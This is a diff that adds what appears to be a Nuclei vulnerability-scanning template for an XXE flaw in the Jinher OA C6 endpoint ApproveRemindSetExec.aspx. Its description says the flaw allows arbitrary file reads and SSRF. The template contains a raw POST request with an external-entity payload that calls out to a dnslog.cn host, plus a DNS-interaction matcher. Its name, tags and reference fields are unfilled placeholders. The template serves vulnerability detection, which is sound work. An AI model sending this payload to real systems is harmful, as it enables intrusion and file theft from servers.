@@ -1,0 +1,29 @@
+id: jinher-c6-ApproveRemindSetExec-xxe
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 金和OA-C6系统接口ApproveRemindSetExec.aspx存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1
+        Host:1.1.1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/xml
+        Content-Length: 96
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wwwwwwwwwwwwwwww.t07q8o.dnslog.cn"> %remote;]>
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
